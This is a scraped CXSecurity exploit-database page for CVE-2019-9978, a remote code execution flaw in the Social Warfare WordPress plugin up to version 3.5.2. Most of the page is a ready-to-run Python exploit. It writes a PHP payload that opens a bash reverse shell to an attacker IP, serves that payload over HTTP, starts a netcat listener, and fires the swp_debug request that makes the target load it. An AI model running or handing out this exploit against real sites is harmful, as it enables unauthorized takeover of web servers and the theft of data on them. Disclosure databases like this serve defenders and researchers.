---
title: Social Warfare WordPress Plugin 3.5.2 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2025070002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-07-02
fetch_date: 2025-10-06T23:16:25.371453
---

# Social Warfare WordPress Plugin 3.5.2 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Social Warfare WordPress Plugin 3.5.2 Remote Code Execution (RCE)** **2025.07.01**  Credit:  **[Huseyin Mardini](https://cxsecurity.com/author/Huseyin%2BMardini/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2019-9978](https://cxsecurity.com/cveshow/CVE-2019-9978/ "Click to see CVE-2019-9978")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "CWE-79")**  CVSS Base Score: **4.3/10**  Impact Subscore: **2.9/10**  Exploitability Subscore: **8.6/10**  Exploit range: **Remote**  Attack complexity: **Medium**  Authentication: **No required**  Confidentiality impact: **None**  Integrity impact: **Partial**  Availability impact: **None** | |

#!/usr/bin/env python3
# Exploit Title: Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)
# Date: 25-06-2025
# Exploit Author: Huseyin Mardini (@housma)
# Original Researcher: Luka Sikic
# Original Exploit Author: hash3liZer
# Vendor Homepage: https://wordpress.org/plugins/social-warfare/
# Software Link: https://downloads.wordpress.org/plugin/social-warfare.3.5.2.zip
# Version: <= 3.5.2
# CVE: CVE-2019-9978
# Tested On: WordPress 5.1.1 with Social Warfare 3.5.2 (on Ubuntu 20.04)
# Python Version: Python 3.x
# Reference: https://www.exploit-db.com/exploits/46794
# Github (original PoC): https://github.com/hash3liZer/CVE-2019-9978
# The currently listed exploit for \*CVE-2019-9978\* (Exploit ID 46794<https://www.exploit-db.com/exploits/46794>) appears to no longer work as intended in many modern environments
# Usage:
# 1. Edit the config section below and replace `ATTACKER\_IP` with your machine's IP.
# 2. Run the script: `python3 exploit.py`
# 3. It will:
# - Create a PHP payload and save it as `payload.txt` (or any filename you set in PAYLOAD\_FILE)
# - Start an HTTP server on `HTTP\_PORT` to host the payload
# - Start a Netcat listener on `LISTEN\_PORT`
# - Trigger the vulnerability via the vulnerable `swp\_debug` parameter
# 4. On success, you get a reverse shell as `www-data`.
#
# Note:
# - PAYLOAD\_FILE defines only the name of the file to be created and served.
# - Make sure ports 8001 and 4444 are open and not in use.
import requests
import threading
import http.server
import socketserver
import os
import subprocess
import time
# --- Config ---
TARGET\_URL = "http://example.com"
ATTACKER\_IP = "xxx.xxx.xx.xx" # Change to your attack box IP
HTTP\_PORT = 8000
LISTEN\_PORT = 4444
PAYLOAD\_FILE = "payload.txt"
def create\_payload():
"""Write exact reverse shell payload using valid PHP syntax"""
payload = f'<pre>system("bash -c \\"bash -i >& /dev/tcp/{ATTACKER\_IP}/{LISTEN\_PORT} 0>&1\\"")</pre>'
with open(PAYLOAD\_FILE, "w") as f:
f.write(payload)
print(f"[+] Payload written to {PAYLOAD\_FILE}")
def start\_http\_server():
"""Serve payload over HTTP"""
handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(("", HTTP\_PORT), handler) as httpd:
print(f"[+] HTTP server running at port {HTTP\_PORT}")
httpd.serve\_forever()
def start\_listener():
"""Start Netcat listener"""
print(f"[+] Listening on port {LISTEN\_PORT} for reverse shell...")
subprocess.call(["nc", "-lvnp", str(LISTEN\_PORT)])
def send\_exploit():
"""Trigger the exploit with vulnerable parameter"""
payload\_url = f"http://{ATTACKER\_IP}:{HTTP\_PORT}/{PAYLOAD\_FILE}"
exploit = f"{TARGET\_URL}/wp-admin/admin-post.php?swp\_debug=load\_options&swp\_url={payload\_url}"
print(f"[+] Sending exploit: {exploit}")
try:
requests.get(exploit, timeout=5)
except requests.exceptions.RequestException:
pass
def main():
create\_payload()
# Start web server in background
http\_thread = threading.Thread(target=start\_http\_server, daemon=True)
http\_thread.start()
time.sleep(2) # Give server time to start
# Start listener in background
listener\_thread = threading.Thread(target=start\_listener)
listener\_thread.start()
time.sleep(1)
# Send the malicious request
send\_exploit()
if \_\_name\_\_ == "\_\_main\_\_":
try:
main()
except KeyboardInterrupt:
print("[-] Interrupted by user.")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025070002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 -1

0%

100%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top